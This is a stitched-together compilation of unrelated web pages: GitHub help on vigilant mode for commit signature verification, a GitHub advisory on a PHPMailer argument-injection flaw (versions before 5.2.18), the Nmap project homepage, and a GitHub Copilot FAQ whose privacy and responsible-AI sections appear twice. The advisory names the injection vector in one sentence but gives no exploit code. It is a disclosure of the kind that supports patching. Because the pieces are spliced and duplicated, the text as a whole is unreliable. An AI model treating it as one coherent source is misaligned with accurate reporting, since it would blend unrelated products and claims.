# Displaying verification statuses for all of your commits

You can enable vigilant mode for commit signature verification to mark all of your commits and tags with a signature verification status.

## In this article

* [About vigilant mode](#about-vigilant-mode)
* [Enabling vigilant mode](#enabling-vigilant-mode)
## [About vigilant mode](#about-vigilant-mode)

When you work locally on your computer, Git allows you to set the author of your changes and the identity of the committer. This, potentially, makes it difficult for other people to be confident that commits and tags you create were actually created by you. To help solve this problem you can sign your commits and tags. For more information, see [Signing commits](/en/authentication/managing-commit-signature-verification/signing-commits) and [Signing tags](/en/authentication/managing-commit-signature-verification/signing-tags). GitHub marks signed commits and tags with a verification status.

By default commits and tags are marked "Verified" if they are signed with a GPG, SSH, or S/MIME key that was successfully verified. If a commit or tag has a signature that can't be verified by GitHub, we mark the commit or tag "Unverified." In all other cases no verification status is displayed.

However, you can give other users increased confidence in the identity attributed to your commits and tags by enabling vigilant mode in your GitHub settings. With vigilant mode enabled, all of your commits and tags are marked with one of three verification statuses:

| Status | Description |
| --- | --- |
| **Verified** | The commit is signed, the signature was successfully verified, and the committer is the only author who has enabled vigilant mode. |
| **Partially verified** | The commit is signed, and the signature was successfully verified, but the commit has an author who: a) is not the committer and b) has enabled vigilant mode. In this case, the commit signature doesn't guarantee the consent of the author, so the commit is only partially verified. |
| **Unverified** | Any of the following is true:- The commit is signed but the signature could not be verified.- The commit is not signed and the committer has enabled vigilant mode.- The commit is not signed and an author has enabled vigilant mode. |

You should only enable vigilant mode if you sign all of your commits and tags and use an email address that is verified for your GitHub account as your committer email address. After enabling this mode, any unsigned commits or tags that you generate locally and push to GitHub will be marked "Unverified."

You can check the verification status of your signed commits or tags on GitHub and view why your commit signatures might be unverified. For more information, see [Checking your commit and tag signature verification status](/en/authentication/troubleshooting-commit-signature-verification/checking-your-commit-and-tag-signature-verification-status).

## [Enabling vigilant mode](#enabling-vigilant-mode)

1. In the upper-right corner of any page on GitHub, click your profile photo, then click  **Settings**.
2. In the "Access" section of the sidebar, click  **SSH and GPG keys**.
3. Under "Vigilant mode," select **Flag unsigned commits as unverified**.

[Vulnerability details](/advisories/GHSA-5f37-gxvh-23v6)
[Dependabot alerts
0](/advisories/GHSA-5f37-gxvh-23v6/dependabot)

## Package

composer

phpmailer/phpmailer
([Composer](/advisories?query=ecosystem%3Acomposer))

## Affected versions

>= 5.0.0, < 5.2.18

## Patched versions

5.2.18

## Description

### Impact

The `mailSend` function in the default `isMail` transport in PHPMailer before 5.2.18 might allow remote attackers to pass extra parameters to the mail command and consequently execute arbitrary code via a &quot; (backslash double quote) in a crafted `Sender` property.

### Patches

Fixed in 5.2.18

### Workarounds

Filter and validate user input before passing it to internal functions.

# Nmap: Discover your network

Nmap ("Network Mapper") is a
[free and open source](/npsl/) utility for
network discovery and security auditing. Many systems and network
administrators also find it useful for tasks such as network
inventory, managing service upgrade schedules, and monitoring host or
service uptime. Nmap uses raw IP packets in novel ways to determine
what hosts are available on the network, what services (application
name and version) those hosts are offering, what operating systems
(and OS versions) they are running, what type of packet
filters/firewalls are in use, and dozens of other characteristics. It
was designed to rapidly scan large networks, but works fine against
single hosts. Nmap runs on all major computer operating systems, and
official binary packages are available for Linux, Windows, and Mac OS
X. In addition to the classic command-line Nmap executable, the Nmap
suite includes an advanced GUI and results viewer
([Zenmap](/zenmap/)), a flexible data
transfer, redirection, and debugging tool
([Ncat](/ncat/)), a utility for
comparing scan results ([Ndiff](/ndiff/)), and a packet generation and response analysis tool ([Nping](/nping/)).

Nmap was named “Security Product of the Year” by Linux
Journal, Info World, LinuxQuestions.Org, and Codetalker Digest. It
was even featured in [twelve
movies](/movies/), including
[The Matrix Reloaded](/movies/#matrix),
[Die Hard 4](/movies/#diehard4),
[Girl With the Dragon Tattoo](/movies/#gwtdt),
and
[The Bourne Ultimatum](/movies/#bourne).

Nmap is ...

* Nmap
  Security
  Port Scanner
* **Flexible**: Supports dozens of advanced techniques for
  mapping out networks filled with IP filters, firewalls, routers, and
  other obstacles. This includes many [port scanning](/book/man-port-scanning-techniques.html) mechanisms (both TCP &
  UDP), [OS
  detection](/book/osdetect.html), [version detection](/book/vscan.html), ping sweeps, and more. See the [documentation page](/docs.html).* **Powerful**: Nmap has been used to scan huge networks of
    literally hundreds of thousands of machines.* **Portable**: Most operating systems are supported, including
      Linux,
      Microsoft Windows,
      FreeBSD,
      OpenBSD,
      Solaris,
      IRIX,
      Mac OS X,
      HP-UX,
      NetBSD,
      Sun OS,
      Amiga,
      and more.* **Easy**: While Nmap offers a rich set of advanced features for
        power users, you can start out as simply as "nmap -v -A *targethost*". Both traditional command line and graphical (GUI)
        versions are available to suit your preference. Binaries are
        available for those who do not wish to compile Nmap from source.* **Free**: The primary goals of the Nmap Project is to help make
          the Internet a little more secure and to provide
          administrators/auditors/hackers with an advanced tool for exploring
          their networks. Nmap is available for [free download](https://nmap.org/download.html), and also comes with full
          source code that you may modify and redistribute under the terms of
          the [license](data/COPYING).* **Well Documented**: Significant effort has been put into
            comprehensive and up-to-date man pages, whitepapers, tutorials, and
            even a whole book! Find them in multiple
            languages [here](/docs.html).* **Supported**: While Nmap comes with no warranty, it is well supported by a vibrant community of developers and users. Most of this interaction occurs on the [Nmap mailing lists](#lists). Most bug reports and questions should be sent to the [nmap-dev list](https://seclists.org/nmap-dev), but only after you read the [guidelines](/book/man-bugs.html). We recommend that all users subscribe to the low-traffic [nmap-hackers](https://seclists.org/nmap-hackers) announcement list. You can also find Nmap on [Facebook](http://facebook.com/nmap) and [Twitter](http://twitter.com/nmap). For real-time chat, join the #nmap channel on [Freenode](http://freenode.net/) or [EFNet](http://www.efnet.org/).* **Acclaimed**: Nmap has won numerous awards, including
                "Information Security Product of the Year" by Linux Journal, Info
                World and Codetalker Digest. It has been featured in hundreds of
                magazine articles, several movies, dozens of books, and one comic book
                series. Visit the [press page](nmap_inthenews.html)
                for further details.* **Popular**: Thousands of people download Nmap every day, and
                  it is included with many operating systems (Redhat Linux, Debian
                  Linux, Gentoo, FreeBSD, OpenBSD, etc). It is among the top ten (out of
                  30,000) programs at the Freshmeat.Net repository. This is important
                  because it lends Nmap its vibrant development and user support
                  communities.

## Communication

Nmap users are encouraged to subscribe to the *Nmap-hackers*
mailing list. It is a low volume (6 posts in 2017), moderated list
for the most important announcements about Nmap, Insecure.org, and
related projects. You can join more than 128,000 current subscribers
by submitting your email address here:

(or subscribe with custom options from the [Nmap-hackers list info page](https://nmap.org/mailman/listinfo/announce))

We also have a development list for more hardcore members
(especially programmers) who are interested in helping the project by
helping with coding, testing, feature ideas, etc. New (test/beta)
versions of Nmap are sometimes released here prior to general
availability for QA purposes. You can subscribe at the [Nmap-dev list
info page](https://nmap.org/mailman/listinfo/dev).

Both lists are archived (along with many other security lists) at [Seclists.org](https://seclists.org).

Though it isn't nearly as active as the mailing lists, the official IRC channel is #nmap on [Freenode](http://freenode.net/) (irc.freenode.net).

### Frequently asked questions

#### General

#### What is GitHub Copilot?

GitHub Copilot transforms the developer experience. Backed by the leaders in AI, Copilot provides contextualized assistance throughout the software development lifecycle, from code completions and chat assistance in the IDE to code explanations and answers to docs in GitHub and more. With Copilot elevating their workflow, developers can focus on more: value, innovation, and happiness.

GitHub Copilot enables developers to focus more energy on problem solving and collaboration and spend less effort on the mundane and boilerplate. That’s why developers who use Copilot report up to 75% higher satisfaction with their jobs than those who don’t and are up to 55% more productive at writing code without sacrifice to quality, which all adds up to engaged developers shipping great software faster.

GitHub Copilot integrates with leading editors, including Visual Studio Code, Visual Studio, JetBrains IDEs, and Neovim, and, unlike other AI coding assistants, is natively built into GitHub. Growing to millions of individual users and tens of thousands of business customers, Copilot is the world’s most widely adopted AI developer tool and the competitive advantage developers ask for by name.

#### Who is eligible to access GitHub Copilot for free?

GitHub Copilot Free is a new free pricing tier with limited functionality for individual developers. Users assigned a Copilot Business or Copilot Enterprise seat are not eligible for access. Users with access to Copilot Pro through a paid subscription, trial, or through an existing verified OSS, Student, Faculty, or MVP account may elect to use Free instead.

#### What languages, IDEs, and platforms does GitHub Copilot support?

GitHub Copilot is trained on all languages that appear in public repositories. For each language, the quality of suggestions you receive may depend on the volume and diversity of training data for that language. For example, JavaScript is well-represented in public repositories and is one of GitHub Copilot’s best supported languages. Languages with less representation in public repositories may produce fewer or less robust suggestions.

GitHub Copilot is available as an extension in Visual Studio Code, Visual Studio, Vim, Neovim, the JetBrains suite of IDEs, and Azure Data Studio. Although code completion functionality is available across all these extensions, chat functionality is currently available only in Visual Studio Code, JetBrains and Visual Studio. GitHub Copilot is also supported in terminals through GitHub CLI and as a chat integration in Windows Terminal Canary. With the GitHub Copilot Enterprise plan, GitHub Copilot is natively integrated into GitHub.com. All plans are supported in GitHub Copilot in GitHub Mobile. GitHub Mobile for Copilot Pro and Copilot Business have access to Bing and public repository code search. Copilot Enterprise in GitHub Mobile gives you additional access to your organization's knowledge.

#### Does GitHub Copilot “copy/paste”?

No, GitHub Copilot generates suggestions using probabilistic determination.

* When thinking about intellectual property and open source issues, it is critical to understand how GitHub Copilot really works. The AI models that create Copilot’s suggestions may be trained on public code, but do not contain any code. When they generate a suggestion, they are not “copying and pasting” from any codebase.
* To generate a code suggestion, the Copilot extension begins by examining the code in your editor—focusing on the lines just before and after your cursor, but also information including other files open in your editor and the URLs of repositories or file paths to identify relevant context. That information is sent to Copilot’s model, to make a probabilistic determination of what is likely to come next and generate suggestions.
* To generate a suggestion for chat in the code editor, the Copilot extension creates a contextual prompt by combining your prompt with additional context including the code file open in your active document, your code selection, and general workspace information, such as frameworks, languages, and dependencies. That information is sent to Copilot’s model, to make a probabilistic determination of what is likely to come next and generate suggestions.
* To generate a suggestion for chat on GitHub.com, such as providing an answer to a question from your chat prompt, Copilot creates a contextual prompt by combining your prompt with additional context including previous prompts, the open pages on GitHub.com as well as retrieved context from your codebase or Bing search. That information is sent to Copilot’s model, to make a probabilistic determination of what is likely to come next and generate suggestions.

#### What are the differences between the GitHub Copilot Business, GitHub Copilot Enterprise, and GitHub Copilot Individual plans?

#### Privacy

#### What personal data does GitHub Copilot process?

GitHub Copilot processes personal data based on how Copilot is accessed and used: whether via GitHub.com, mobile app, extensions, or one of various IDE extensions, or through features like suggestions for the command line interface (CLI), IDE code completions, or personalized chat on GitHub.com. The types of personal data processed may include:

* **User Engagement Data:** This includes pseudonymous identifiers captured on user interactions with Copilot, such as accepted or dismissed completions, error messages, system logs, and product usage metrics.
* **Prompts:** These are inputs for chat or code, along with context, sent to Copilot's AI to generate suggestions.
* **Suggestions:** These are the AI-generated code lines or chat responses provided to users based on their prompts.
* **Feedback Data:** This comprises real-time user feedback, including reactions (e.g., thumbs up/down) and optional comments, along with feedback from support tickets.

#### Does GitHub use Copilot Business or Enterprise data to train GitHub’s model?

No. GitHub does not use either Copilot Business or Enterprise data to train its models.

#### How does GitHub use the Copilot data?

How GitHub uses Copilot data depends on how the user accesses Copilot and for what purpose. Users can access GitHub Copilot through the web, extensions, mobile apps, computer terminal, and various IDEs (Integrated Development Environments). GitHub generally uses personal data to:

* Deliver, maintain, and update the services as per the customer's configuration and usage, to ensure personalized experiences and recommendations
* Troubleshoot, which involves preventing, detecting, resolving, and mitigating issues, including security incidents and product-related problems, by fixing software bugs and maintaining the online services' functionality and up-to-dateness
* Enhance user productivity, reliability, effectiveness, quality, privacy, accessibility, and security by keeping the service current and operational

These practices are outlined in GitHub’s Data Protection Agreement ([DPA)](https://github.com/customer-terms/github-data-protection-agreement), which details our data handling commitments to our data controller customers.

GitHub also uses certain personal data with customer authorization under the DPA, for the following purposes:

* Billing and account management
* To comply with and resolve legal obligations
* For abuse detection, prevention, and protection, virus scanning, and scanning to detect violations of terms of service
* To generate summary reports for calculating employee commissions and partner incentives
* To produce aggregated reports for internal use and strategic planning, covering areas like forecasting, revenue analysis, capacity planning, and product strategy,

For details on GitHub's data processing activities as a controller, particularly for Copilot Pro customers, refer to the [GitHub Privacy Statement](https://docs.github.com/en/site-policy/privacy-policies/github-general-privacy-statement).

#### How long does GitHub retain Copilot data for Business and Enterprise customers?

If and for how long GitHub’s retains Copilot data depends on how a Copilot user accesses Copilot and for what purpose. The default settings for Copilot Business and Enterprise Customers are as follows:

**Access through IDE for Chat and Code Completions:**

* Prompts and Suggestions: Not retained
* User Engagement Data: Kept for two years.
* Feedback Data: Stored for as long as needed for its intended purpose.

**All other GitHub Copilot access and use:**

* Prompts and Suggestions: Retained for 28 days.
* User Engagement Data: Kept for two years.
* Feedback Data: Stored for as long as needed for its intended purpose.

#### Why do some Copilot features retain prompts and suggestions?

Retaining prompts and suggestions is necessary for chat on github.com, mobile, and CLI Copilot because those features’ effectiveness depends on using thread history to improve responses. The Copilot model requires access to previous interactions to deliver accurate and relevant suggestions.

#### Does GitHub Copilot support compliance with the GDPR and other data protection laws?

Yes. GitHub and customers can enter a [Data Protection Agreement](https://github.com/customer-terms/github-data-protection-agreement) that supports compliance with the GDPR and similar legislation.

#### Does GitHub Copilot ever output personal data?

While we've designed GitHub Copilot with privacy in mind, the expansive definition of personal data under legislation like the EU’s General Data Protection Regulation (GDPR) means we can't guarantee it will never output such data. The Large Language Model (LLM) powering GitHub Copilot was trained on public code and there were instances in our tests where the tool made suggestions resembling personal data. These suggestions were typically synthesized and not tied to real individuals.

#### How does Copilot allow users to access, alter or delete personal data?

These actions are available to Copilot users as described in the [GitHub Privacy Statement](https://docs.github.com/en/site-policy/privacy-policies/github-general-privacy-statement#your-privacy-rights).

#### Responsible AI

#### What are the intellectual property considerations when using GitHub Copilot?

The primary IP considerations for GitHub Copilot relate to copyright. The model that powers Copilot is trained on a broad collection of publicly accessible code, which may include copyrighted code, and Copilot’s suggestions (in rare instances) may resemble the code its model was trained on. Here’s some basic information you should know about these considerations:

Copyright law permits the use of copyrighted works to train AI models:  Countries around the world have provisions in their copyright laws that enable machines to learn, understand, extract patterns, and facts from copyrighted materials, including software code. For example, the European Union, Japan, and Singapore, have express provisions permitting machine learning to develop AI models. Other countries including Canada, India, and the United States also permit such training under their fair use/fair dealing provisions. GitHub Copilot’s AI model was trained with the use of code from GitHub’s public repositories—which are publicly accessible and within the scope of permissible copyright use.

What about copyright risk in suggestions? In rare instances (less than 1% based on GitHub’s research), suggestions from GitHub may match examples of code used to train GitHub’s AI model. Again, Copilot does not “look up” or “copy and paste” code, but is instead using context from a user’s workspace to synthesize and generate a suggestion.

Our experience shows that matching suggestions are most likely to occur in two situations: (i) when there is little or no context in the code editor for Copilot’s model to synthesize, or (ii) when a matching suggestion represents a common approach or method. If a code suggestion matches existing code, there is risk that using that suggestion could trigger claims of copyright infringement, which would depend on the amount and nature of code used, and the context of how the code is used. In many ways, this is the same risk that arises when using any code that a developer does not originate, such as copying code from an online source, or reusing code from a library. That is why responsible organizations and developers recommend that users employ code scanning policies to identify and evaluate potential matching code.

In Copilot, you can opt whether to allow Copilot to suggest code completions that match publicly available code on GitHub.com. For more information, see "[Configuring GitHub Copilot settings on GitHub.com](https://docs-internal-46619-d1aa34.preview.ghdocs.com/en/copilot/configuring-github-copilot/configuring-github-copilot-settings-on-githubcom#enabling-or-disabling-duplication-detection)". If you have allowed suggestions that match public code, GitHub Copilot can provide you with details about the matching code when you accept such suggestions. Matching code does not necessarily mean copyright infringement, so it is ultimately up to the user to determine whether to use the suggestion, and what and who to attribute (along with other license compliance) in appropriate circumstances.

#### Does GitHub Copilot include a filtering mechanism to mitigate risk?

Yes, GitHub Copilot does include an optional code referencing filter to detect and suppress certain suggestions that match public code on GitHub.

* GitHub has created a duplication detection filter to detect and suppress suggestions that contain code segments over a certain length that match public code on GitHub. This filter can be enabled by the administrator for your enterprise and it can apply for all organizations within your enterprise, or the administrator can defer control to individual organizations.
* With the filter enabled, Copilot checks code suggestions for matches or near-matches against public code on GitHub of 65 lexemes or more (on average,150 characters). If there is a match, the suggestion will not be shown to the user.
* In addition to off-topic, harmful, and offensive output filters, GitHub Copilot also scans the outputs for vulnerable code.

#### Does GitHub Copilot include features to make it easier for users to identify potentially relevant open source licenses for matching suggestions?

Yes, GitHub Copilot is previewing a [code referencing feature](https://github.blog/2023-08-03-introducing-code-referencing-for-github-copilot/) as an additional tool to assist users to find and review potentially relevant open source licenses. Code referencing is currently available in Visual Studio Code. This feature searches across public GitHub repositories for code that matches a Copilot suggestion. If there’s a match, users will find its information displayed in the Copilot console log, including where the match occurred, any applicable licenses, and a deep link to learn more. The deep link will take users to a navigable page on GitHub.com to browse examples of the code match and their repository licenses, and see how many repositories—including ones without licenses—that code appears in, as well as links to those repositories. Copilot users can review this information to determine whether the applicable suggestions are suitable for use, and whether additional measures may be necessary to use them.

#### Who owns the suggestions provided by GitHub Copilot?

We don’t determine whether a suggestion is capable of being owned, but we are clear that GitHub does not claim ownership of a suggestion. Whether a suggestion generated by an AI model can be owned depends on many factors (e.g. the intellectual property law in the relevant country, the length of the suggestion, the extent that suggestion is considered ‘functional’ instead of expressive, etc).

* If a suggestion is capable of being owned, our terms are clear: GitHub does not claim ownership.
* GitHub does not claim ownership of any suggestion. In certain cases, it is possible for Copilot to produce similar suggestions to different users. For example, two unrelated users both starting new files to code the quicksort algorithm in Java will likely get the same suggestion. The possibility of providing similar suggestions to multiple users is a common part of generative AI systems.

#### Can GitHub Copilot introduce insecure code in its suggestions?

Public code may contain insecure coding patterns, bugs, or references to outdated APIs or idioms. When GitHub Copilot synthesizes code suggestions based on this data, it can also synthesize code that contains these undesirable patterns. Copilot has filters in place that either block or notify users of insecure code patterns that are detected in Copilot suggestions. These filters target the most common vulnerable coding patterns, including [hardcoded credentials](https://cwe.mitre.org/data/definitions/798.html), [SQL injections](https://cwe.mitre.org/data/definitions/89.html), and [path injections](https://cwe.mitre.org/data/definitions/22.html). Additionally, in recent years we’ve provided tools such as GitHub Advanced Security, GitHub Actions, Dependabot, and CodeQL to open source projects to help improve code quality. Of course, you should always use GitHub Copilot together with good testing and code review practices and security tools, as well as your own judgment.

#### Is GitHub Copilot intended to fully automate code generation and replace developers?

No. Copilot is a tool intended to make developers more efficient. It’s not intended to replace developers, who should continue to apply the same sorts of safeguards and diligence they would apply with regard to any third-party code of unknown origin.

* The product is called “Copilot” not “Autopilot” and it’s not intended to generate code without oversight. You should use exactly the same sorts of safeguards and diligence with Copilot’s suggestions as you would use with any third-party code.
* Identifying best practices for use of third party code is beyond the scope of this section. That said, whatever practices your organization currently uses – rigorous functionality testing, code scanning, security testing, etc. – you should continue these policies with Copilot’s suggestions. Moreover, you should make sure your code editor or editor does not automatically compile or run generated code before you review it.

#### Can GitHub Copilot users simply use suggestions without concern?

Not necessarily. GitHub Copilot users should align their use of Copilot with their respective risk tolerances.

* As noted above, GitHub Copilot is not intended to replace developers, or their individual skill and judgment, and is not intended to fully automate the process of code development. The same risks that apply to the use of any third-party code apply to the use of Copilot’s suggestions.
* Depending on your particular use case, you should consider implementing the protections discussed above. It is your responsibility to assess what is appropriate for the situation and implement appropriate safeguards.
* You’re entitled to IP indemnification from GitHub for the unmodified suggestions when Copilot’s filtering is enabled. If you do elect to enable this feature, the copyright responsibility is ours, not our customers. As part of our ongoing commitment to responsible AI, GitHub and Microsoft extends our IP indemnity and protection support to our customers who are empowering their teams with GitHub Copilot. See [Microsoft's Copilot Copyright Commitment](https://blogs.microsoft.com/on-the-issues/2023/09/07/copilot-copyright-commitment-ai-legal-concerns/) for more details.

#### Does GitHub Copilot support accessibility features?

We are conducting internal testing of GitHub Copilot’s ease of use by developers with disabilities and working to ensure that GitHub Copilot is accessible to all developers. Please feel free to share your feedback on GitHub Copilot accessibility in our [feedback forum](https://github.com/github-community/community/discussions/categories/copilot).

#### Does GitHub Copilot produce offensive outputs?

GitHub Copilot includes filters to block offensive language in the prompts and to avoid synthesizing suggestions in sensitive contexts. We continue to work on improving the filter system to more intelligently detect and remove offensive outputs. If you see offensive outputs, please report them directly to copilot-safety@github.com so that we can improve our safeguards. GitHub takes this challenge very seriously and we are committed to addressing it.

#### Will GitHub Copilot work as well using languages other than English?

Given public sources are predominantly in English, GitHub Copilot will likely work less well in scenarios where natural language prompts provided by the developer are not in English and/or are grammatically incorrect. Therefore, non-English speakers might experience a lower quality of service.

#### What data has GitHub Copilot been trained on?

GitHub Copilot is powered by generative AI models developed by GitHub, OpenAI, and Microsoft. It has been trained on natural language text and source code from publicly available sources, including code in public repositories on GitHub.

1. Data from June 2023. Additional research can be found [here](https://github.blog/news-insights/research/the-economic-impact-of-the-ai-powered-developer-lifecycle-and-lessons-from-github-copilot/).
2. Feature in public beta for Copilot Pro and Business plans. Requires use of repositories, issues, discussions, Actions, and other features of GitHub.
3. Authentication with SAML single sign-on (SSO) available for organizations using GitHub Enterprise Cloud.

GitHub Copilot is powered by generative AI models developed by GitHub, OpenAI, and Microsoft. It has been trained on natural language text and source code from publicly available sources, including code in public repositories on GitHub.

#### Which plan includes GitHub Copilot Autofix?

GitHub Copilot Autofix provides contextual explanations and code suggestions to help developers fix vulnerabilities in code, and is included in [GitHub Advanced Security](https://github.com/enterprise/advanced-security).

#### What if I do not want Copilot?

Copilot is entirely optional and requires you to opt in before gaining access. You can easily configure its usage directly in the editor, enabling or disabling it at any time. Additionally, you have control over which file types Copilot is active for.

#### How do I control access to Copilot in my company?

Access to Copilot Business and Enterprise is managed by your GitHub Administrator. They can control access to preview features, models, and set Copilot policies for your organization. Additionally, you can use your network firewall to explicitly allow access to Copilot Business and/or block access to Copilot Pro or Free. For more details, refer to the [documentation](https://docs.github.com/en/copilot/managing-copilot/managing-github-copilot-in-your-organization/managing-access-to-github-copilot-in-your-organization).

### Plans & Pricing

#### What are the differences between the Free, Pro, Business, and Enterprise plans?

GitHub Copilot has multiple offerings for organizations and an offering for individual developers. All the offerings include both code completion and chat assistance. The primary differences between the organization offerings and the individual offering are license management, policy management, and IP indemnity.

Organizations can choose between GitHub Copilot Business and GitHub Copilot Enterprise. GitHub Copilot Business primarily features GitHub Copilot in the coding environment - that is the IDE, CLI and GitHub Mobile. GitHub Copilot Enterprise includes everything in GitHub Copilot Business. It also  adds an additional layer of customization for organizations and integrates into GitHub.com as a chat interface to allow developers to converse with Copilot  throughout the platform. GitHub Copilot Enterprise can index an organization’s codebase for a deeper understanding of the customer’s knowledge for more tailored suggestions and will offer customers access to fine-tuned custom, private models for code completion.

GitHub Copilot Pro is designed for individual developers, freelancers, students, educators, and open source maintainers. The plan includes all the features of GitHub Copilot Business except organizational license management, policy management, and IP indemnity.

#### How can I upgrade my GitHub Copilot Free license to Copilot Pro?

If you're on the Free plan, you can upgrade to Pro through your [Copilot settings page](https://github.com/settings/copilot) or directly on the [Copilot marketing page](https://github.com/features/copilot).

#### What is included in GitHub Copilot Free?

GitHub Copilot Free users are limited to 2000 completions and 50 chat requests (including Copilot Edits).

#### Which plan includes GitHub Copilot Autofix?

GitHub Copilot Autofix provides contextual explanations and code suggestions to help developers fix vulnerabilities in code, and is included in GitHub Advanced Security and available to all public repositories.

### Privacy

#### What personal data does GitHub Copilot process?

GitHub Copilot processes personal data based on how Copilot is accessed and used: whether via GitHub.com, mobile app, extensions, or one of various IDE extensions, or through features like suggestions for the command line interface (CLI), IDE code completions, or personalized chat on GitHub.com. The types of personal data processed may include:

* **User Engagement Data:** This includes pseudonymous identifiers captured on user interactions with Copilot, such as accepted or dismissed completions, error messages, system logs, and product usage metrics.
* **Prompts:** These are inputs for chat or code, along with context, sent to Copilot's AI to generate suggestions.
* **Suggestions:** These are the AI-generated code lines or chat responses provided to users based on their prompts.
* **Feedback Data:** This comprises real-time user feedback, including reactions (e.g., thumbs up/down) and optional comments, along with feedback from support tickets.

#### Does GitHub use Copilot Business or Enterprise data to train GitHub’s model?

No. GitHub does not use either Copilot Business or Enterprise data to train its models.

#### How does GitHub use the Copilot data?

How GitHub uses Copilot data depends on how the user accesses Copilot and for what purpose. Users can access GitHub Copilot through the web, extensions, mobile apps, computer terminal, and various IDEs (Integrated Development Environments). GitHub generally uses personal data to:

* Deliver, maintain, and update the services as per the customer's configuration and usage, to ensure personalized experiences and recommendations
* Troubleshoot, which involves preventing, detecting, resolving, and mitigating issues, including security incidents and product-related problems, by fixing software bugs and maintaining the online services' functionality and up-to-dateness
* Enhance user productivity, reliability, effectiveness, quality, privacy, accessibility, and security by keeping the service current and operational

These practices are outlined in GitHub’s Data Protection Agreement ([DPA)](https://github.com/customer-terms/github-data-protection-agreement), which details our data handling commitments to our data controller customers.

GitHub also uses certain personal data with customer authorization under the DPA, for the following purposes:

* Billing and account management
* To comply with and resolve legal obligations
* For abuse detection, prevention, and protection, virus scanning, and scanning to detect violations of terms of service
* To generate summary reports for calculating employee commissions and partner incentives
* To produce aggregated reports for internal use and strategic planning, covering areas like forecasting, revenue analysis, capacity planning, and product strategy,

For details on GitHub's data processing activities as a controller, particularly for Copilot Pro customers, refer to the [GitHub Privacy Statement](https://docs.github.com/en/site-policy/privacy-policies/github-general-privacy-statement).

#### How long does GitHub retain Copilot data for Business and Enterprise customers?

If and for how long GitHub’s retains Copilot data depends on how a Copilot user accesses Copilot and for what purpose. The default settings for Copilot Business and Enterprise Customers are as follows:

**Access through IDE for Chat and Code Completions:**

* Prompts and Suggestions: Not retained
* User Engagement Data: Kept for two years.
* Feedback Data: Stored for as long as needed for its intended purpose.

**All other GitHub Copilot access and use:**

* Prompts and Suggestions: Retained for 28 days.
* User Engagement Data: Kept for two years.
* Feedback Data: Stored for as long as needed for its intended purpose.

#### Why do some Copilot features retain prompts and suggestions?

Retaining prompts and suggestions is necessary for chat on github.com, mobile, and CLI Copilot because those features’ effectiveness depends on using thread history to improve responses. The Copilot model requires access to previous interactions to deliver accurate and relevant suggestions.

#### Does GitHub Copilot support compliance with the GDPR and other data protection laws?

Yes. GitHub and customers can enter a [Data Protection Agreement](https://github.com/customer-terms/github-data-protection-agreement) that supports compliance with the GDPR and similar legislation.

#### Does GitHub Copilot ever output personal data?

While we've designed GitHub Copilot with privacy in mind, the expansive definition of personal data under legislation like the EU’s General Data Protection Regulation (GDPR) means we can't guarantee it will never output such data. The Large Language Model (LLM) powering GitHub Copilot was trained on public code and there were instances in our tests where the tool made suggestions resembling personal data. These suggestions were typically synthesized and not tied to real individuals.

#### How does Copilot allow users to access, alter or delete personal data?

These actions are available to Copilot users as described in the [GitHub Privacy Statement](https://docs.github.com/en/site-policy/privacy-policies/github-general-privacy-statement#your-privacy-rights).

### Responsible AI

#### What are the intellectual property considerations when using GitHub Copilot?

The primary IP considerations for GitHub Copilot relate to copyright. The model that powers Copilot is trained on a broad collection of publicly accessible code, which may include copyrighted code, and Copilot’s suggestions (in rare instances) may resemble the code its model was trained on. Here’s some basic information you should know about these considerations:

Copyright law permits the use of copyrighted works to train AI models:  Countries around the world have provisions in their copyright laws that enable machines to learn, understand, extract patterns, and facts from copyrighted materials, including software code. For example, the European Union, Japan, and Singapore, have express provisions permitting machine learning to develop AI models. Other countries including Canada, India, and the United States also permit such training under their fair use/fair dealing provisions. GitHub Copilot’s AI model was trained with the use of code from GitHub’s public repositories—which are publicly accessible and within the scope of permissible copyright use.

What about copyright risk in suggestions? In rare instances (less than 1% based on GitHub’s research), suggestions from GitHub may match examples of code used to train GitHub’s AI model. Again, Copilot does not “look up” or “copy and paste” code, but is instead using context from a user’s workspace to synthesize and generate a suggestion.

Our experience shows that matching suggestions are most likely to occur in two situations: (i) when there is little or no context in the code editor for Copilot’s model to synthesize, or (ii) when a matching suggestion represents a common approach or method. If a code suggestion matches existing code, there is risk that using that suggestion could trigger claims of copyright infringement, which would depend on the amount and nature of code used, and the context of how the code is used. In many ways, this is the same risk that arises when using any code that a developer does not originate, such as copying code from an online source, or reusing code from a library. That is why responsible organizations and developers recommend that users employ code scanning policies to identify and evaluate potential matching code.

In Copilot, you can opt whether to allow Copilot to suggest code completions that match publicly available code on GitHub.com. For more information, see "[Configuring GitHub Copilot settings on GitHub.com](https://docs-internal-46619-d1aa34.preview.ghdocs.com/en/copilot/configuring-github-copilot/configuring-github-copilot-settings-on-githubcom#enabling-or-disabling-duplication-detection)". If you have allowed suggestions that match public code, GitHub Copilot can provide you with details about the matching code when you accept such suggestions. Matching code does not necessarily mean copyright infringement, so it is ultimately up to the user to determine whether to use the suggestion, and what and who to attribute (along with other license compliance) in appropriate circumstances.

#### Does GitHub Copilot include a filtering mechanism to mitigate risk?

Yes, GitHub Copilot does include an optional code referencing filter to detect and suppress certain suggestions that match public code on GitHub.

* GitHub has created a duplication detection filter to detect and suppress suggestions that contain code segments over a certain length that match public code on GitHub. This filter can be enabled by the administrator for your enterprise and it can apply for all organizations within your enterprise, or the administrator can defer control to individual organizations.
* With the filter enabled, Copilot checks code suggestions for matches or near-matches against public code on GitHub of 65 lexemes or more (on average,150 characters). If there is a match, the suggestion will not be shown to the user.
* In addition to off-topic, harmful, and offensive output filters, GitHub Copilot also scans the outputs for vulnerable code.

#### Does GitHub Copilot include features to make it easier for users to identify potentially relevant open source licenses for matching suggestions?

Yes, GitHub Copilot is previewing a [code referencing feature](https://github.blog/2023-08-03-introducing-code-referencing-for-github-copilot/) as an additional tool to assist users to find and review potentially relevant open source licenses. Code referencing is currently available in Visual Studio Code. This feature searches across public GitHub repositories for code that matches a Copilot suggestion. If there’s a match, users will find its information displayed in the Copilot console log, including where the match occurred, any applicable licenses, and a deep link to learn more. The deep link will take users to a navigable page on GitHub.com to browse examples of the code match and their repository licenses, and see how many repositories—including ones without licenses—that code appears in, as well as links to those repositories. Copilot users can review this information to determine whether the applicable suggestions are suitable for use, and whether additional measures may be necessary to use them.

#### Who owns the suggestions provided by GitHub Copilot?

We don’t determine whether a suggestion is capable of being owned, but we are clear that GitHub does not claim ownership of a suggestion. Whether a suggestion generated by an AI model can be owned depends on many factors (e.g. the intellectual property law in the relevant country, the length of the suggestion, the extent that suggestion is considered ‘functional’ instead of expressive, etc).

